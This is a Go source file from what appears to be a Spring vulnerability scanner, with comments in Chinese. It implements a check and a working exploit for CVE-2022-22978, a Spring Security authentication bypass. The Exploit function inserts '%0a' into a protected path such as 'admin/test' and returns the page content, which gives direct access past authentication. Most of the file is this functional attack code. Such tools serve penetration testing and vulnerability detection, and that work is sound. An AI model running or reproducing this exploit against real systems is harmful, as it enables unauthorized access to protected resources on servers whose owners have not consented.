package vulns

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2022-22978 Spring Security RegexRequestMatcher 认证绕过：
// 使用含 `.` 的正则匹配器时，请求路径中插入 %0a/%0d 可绕过认证
// 直接访问受保护资源。
type cve202222978 struct{}

func init() { Register(&cve202222978{}) }

const (
	secProtectedPath = "admin/test"
	secBypassPath    = "admin/%0atest"
)

func (c *cve202222978) Info() model.Info {
	return model.Info{
		ID:         "CVE-2022-22978",
		Name:       "Spring Security RegexRequestMatcher 认证绕过",
		Type:       "AuthBypass",
		Severity:   "high",
		Affected:   "Spring Security 5.5.6 / 5.6.3 及更早（RegexRequestMatcher + `.` 正则）",
		Reference:  "https://tanzu.vmware.com/security/cve-2022-22978",
		HasExploit: true,
		ArgHint:    "要访问的受保护路径（默认 admin/test）",
	}
}

// bypassGet 用 %0a 绕过请求受保护路径。
func (c *cve202222978) bypassGet(ctx context.Context, t model.Target, path string) (int, []byte, error) {
	u := t.URL + path
	resp, body, err := client.Do(ctx, t.Client, http.MethodGet, u, nil, "")
	if err != nil {
		return 0, nil, err
	}
	return resp.StatusCode, body, nil
}

func (c *cve202222978) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	// 正常请求受保护资源：预期被拒（401/403/302）
	codeNormal, _, err := c.bypassGet(ctx, t, secProtectedPath)
	if err != nil {
		return nil, err
	}
	// 绕过请求：路径中插入换行
	codeBypass, _, err := c.bypassGet(ctx, t, secBypassPath)
	if err != nil {
		return nil, err
	}

	denied := func(code int) bool {
		return code == http.StatusUnauthorized || code == http.StatusForbidden ||
			code == http.StatusFound || code == http.StatusMovedPermanently
	}
	if denied(codeNormal) && codeBypass == http.StatusOK {
		v.Vulnerable = true
		v.Evidence = fmt.Sprintf("正常请求 %s 返回 %d，插入 %%0a 后返回 200", secProtectedPath, codeNormal)
		v.Detail = "认证绕过成功，可直接访问受保护资源"
	} else if codeBypass == http.StatusOK && codeNormal == http.StatusOK {
		v.Detail = "受保护资源未启用访问控制，与该 CVE 无关"
	}
	return v, nil
}

// Exploit 的 arg 为要访问的受保护路径（如 admin/test），返回页面内容。
func (c *cve202222978) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	seg := strings.SplitN(strings.TrimPrefix(arg, "/"), "/", 2)
	right := "test"
	if len(seg) == 2 {
		right = seg[1]
	}
	code, body, err := c.bypassGet(ctx, t, seg[0]+"/%0a"+right)
	if err != nil {
		return "", "", err
	}
	if code != http.StatusOK {
		return "", fmt.Sprintf("绕过请求返回状态码 %d", code), nil
	}
	return string(body), "", nil
}
